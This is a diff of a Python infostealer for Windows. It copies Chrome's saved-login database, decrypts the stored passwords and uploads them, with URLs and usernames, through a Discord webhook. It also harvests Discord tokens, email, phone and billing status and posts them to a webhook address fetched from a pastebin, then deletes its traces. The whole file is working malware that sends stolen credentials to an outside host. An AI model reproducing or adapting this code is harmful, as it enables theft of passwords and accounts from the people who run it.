@@ -1,25 +1,25 @@
 import os
 if os.name != "nt":
     exit()
-from re import findall
 import json
-import platform as plt
-from json import loads, dumps
 import base64
-from subprocess import Popen, PIPE
-from urllib.request import Request, urlopen
 import requests
 import win32crypt
-from datetime import timezone, datetime, timedelta
 import shutil
-from Crypto.Cipher import AES
 import sqlite3
 import sys
 import discord
 import time
+import platform as plt
+from re import findall
+from json import loads, dumps
+from subprocess import Popen, PIPE
+from urllib.request import Request, urlopen
+from datetime import timezone, datetime, timedelta
+from Crypto.Cipher import AES
+import win32com.shell.shell as shell
 
-
-url = "https://google.com" # webhook url here
+url = "pastebin or hastebin with discord webhook url"
 r = requests.get(url)
 webhook_url = r.text
 
@@ -173,9 +173,6 @@ def decrypt_password(password, key):
 
 
 def chrome_date_and_time(chrome_data):
-    # Chrome_data format is 'year-month-date
-    # hr:mins:seconds.milliseconds
-    # This will return datetime.datetime Object
     return datetime(1601, 1, 1) + timedelta(microseconds=chrome_data)
 
 
@@ -216,28 +213,100 @@ def password_decryption(password, encryption_key):
 
 
 def main():
-    key = fetching_encryption_key()
-    db_path = os.path.join(
-        os.environ["USERPROFILE"],
-        "AppData",
-        "LOCAL",
-        "Google",
-        "Chrome",
-        "User Data",
-        "default",
-        "Login Data")
-    filename = "ChromePasswords.db"
-    shutil.copyfile(db_path, filename)
+    embeds = []
+    working = []
+    checked = []
+    already_cached_tokens = []
+    working_ids = []
+    computer_os = plt.platform()
+    pc_username = os.getenv("UserName")
+    pc_name = os.getenv("COMPUTERNAME")
+    for platform, path in PATHS.items():
+        if not os.path.exists(path):
+            continue
+        for token in gettokens(path):
+            if token in checked:
+                continue
+            checked.append(token)
+            uid = None
+            if not token.startswith("mfa."):
+                try:
+                    uid = b64decode(token.split(".")[0].encode()).decode()
+                except BaseException:
+                    pass
+                if not uid or uid in working_ids:
+                    continue
+            user_data = getuserdata(token)
+            if not user_data:
+                continue
+            working_ids.append(uid)
+            working.append(token)
+            username = user_data["username"] + \
+                "#" + str(user_data["discriminator"])
+            user_id = user_data["id"]
+            locale = user_data['locale']
+            email = user_data.get("email")
+            phone = user_data.get("phone")
+            verified = user_data['verified']
+            mfa_enabled = user_data['mfa_enabled']
+            flags = user_data['flags']
 
-    db = sqlite3.connect(filename)
-    cursor = db.cursor()
+            creation_date = datetime.utcfromtimestamp(
+                ((int(user_id) >> 22) + 1420070400000) / 1000).strftime('%d-%m-%Y・%H:%M:%S')
 
-    cursor.execute(
-        "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins "
+            language = languages.get(locale)
+            nitro = bool(user_data.get("premium_type"))
+            billing = bool(has_payment_methods(token))
+            embed = {"color": 2,
+                     "fields": [{"name": "**Account Info**",
+                                 "value": f'Email: {email}\nPhone: {phone}\nNitro: {nitro}\nBilling Info: {billing}',
+                                 "inline": True},
+                                {"name": "**Token**",
+                                 "value": f"`{token}`",
+                                 "inline": False}],
+                     "author": {"name": f"{username}・{user_id}",
+                                },
+                     "footer": {"text": "test"}}
+            embeds.append(embed)
+
+    if len(working) == 0:
+        working.append('123')
+    webhook_info = {
+        "content": "",
+        "embeds": embeds,
+        "username": "demo",
+        "avatar_url": "https://avatarfiles.alphacoders.com/977/thumb-1920-97774.gif"}
+    try:
+        urlopen(
+            Request(
+                webhook_url,
+                data=dumps(webhook_info).encode(),
+                headers=getheaders()))
+    except BaseException:
+        pass
+
+
+key = fetching_encryption_key()
+db_path = os.path.join(
+    os.environ["USERPROFILE"],
+    "AppData",
+    "LOCAL",
+    "Google",
+    "Chrome",
+    "User Data",
+    "default",
+    "Login Data")
+filename = "ChromePasswords.db"
+shutil.copyfile(db_path, filename)
+shutil.copy(filename, f"C:\\Users\\{os.getenv('username')}\\Saved Games")
+db = sqlite3.connect(filename)
+cursor = db.cursor()
+
+cursor.execute(
+       "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins "
         "order by date_last_used")
 
-    # iterate over all rows
-    for row in cursor.fetchall():
+for row in cursor.fetchall():
         main_url = row[0]
         login_page_url = row[1]
         user_name = row[2]
@@ -246,103 +315,32 @@ def main():
         last_usuage = row[5]
 
         if user_name or decrypted_password:
-            file_name = r"demo.txt"
+            demoname = f"{os.getenv('username')}_demo.txt"
+            with open(demoname, "w") as file1:
+                file1.write(f"URL: {login_page_url} \n")
+                file1.write(f"User: {user_name} \n")
+                file1.write(f"Password: {decrypted_password} \n")
 
-            file1 = open(file_name, "w")
-            file1.write(f"URL: {login_page_url} \n")
-            file1.write(f"User: {user_name} \n")
-            file1.write(f"Password: {decrypted_password} \n")
-            file1.close()
             webhook = discord.Webhook.partial(
-                111111111, # your webhook id
-                '2222222222s2d2d2d2d2d2d', # your webhook token
+                11111111111111110,  # your webhook id
+                # your webhook token
+                'sfdjnjidf2398fni90trefqvt43t',
                 adapter=discord.RequestsWebhookAdapter())
 
-            with open(file='demo.txt', mode='rb') as f:
+            with open(file=demoname, mode='rb') as f:
                 my_file = discord.File(f)
+                webhook.send('', username='demo', file=my_file)
 
-            webhook.send('', username='demo', file=my_file)
+            os.remove(demoname)
         else:
             continue
-    cursor.close()
-    db.close()
+cursor.close()
+db.close()
 
-    try:
+try:
         os.remove(filename)
-    except BaseException:
+except BaseException:
         pass
-
-        embeds = []
-        working = []
-        checked = []
-        already_cached_tokens = []
-        working_ids = []
-        computer_os = plt.platform()
-        pc_username = os.getenv("UserName")
-        pc_name = os.getenv("COMPUTERNAME")
-        for platform, path in PATHS.items():
-            if not os.path.exists(path):
-                continue
-            for token in gettokens(path):
-                if token in checked:
-                    continue
-                checked.append(token)
-                uid = None
-                if not token.startswith("mfa."):
-                    try:
-                        uid = b64decode(token.split(".")[0].encode()).decode()
-                    except BaseException:
-                        pass
-                    if not uid or uid in working_ids:
-                        continue
-                user_data = getuserdata(token)
-                if not user_data:
-                    continue
-                working_ids.append(uid)
-                working.append(token)
-                username = user_data["username"] + \
-                    "#" + str(user_data["discriminator"])
-                user_id = user_data["id"]
-                locale = user_data['locale']
-                email = user_data.get("email")
-                phone = user_data.get("phone")
-                verified = user_data['verified']
-                mfa_enabled = user_data['mfa_enabled']
-                flags = user_data['flags']
-
-                creation_date = datetime.utcfromtimestamp(
-                    ((int(user_id) >> 22) + 1420070400000) / 1000).strftime('%d-%m-%Y・%H:%M:%S')
-
-                language = languages.get(locale)
-                nitro = bool(user_data.get("premium_type"))
-                billing = bool(has_payment_methods(token))
-                embed = {"color": 2,
-                         "fields": [{"name": "**Account Info**",
-                                     "value": f'Email: {email}\nPhone: {phone}\nNitro: {nitro}\nBilling Info: {billing}',
-                                     "inline": True},
-                                    {"name": "**Token**",
-                                     "value": f"`{token}`",
-                                     "inline": False}],
-                         "author": {"name": f"{username}・{user_id}",
-                                    },
-                         "footer": {"text": "test"}}
-                embeds.append(embed)
-
-        if len(working) == 0:
-            working.append('123')
-        webhook_info = {
-            "content": "",
-            "embeds": embeds,
-            "username": "demo",
-            "avatar_url": "https://avatarfiles.alphacoders.com/977/thumb-1920-97774.gif"}
-        try:
-            urlopen(
-                Request(
-                    webhook_url,
-                    data=dumps(webhook_info).encode(),
-                    headers=getheaders()))
-        except BaseException:
-            pass
 
 
 if __name__ == "__main__":
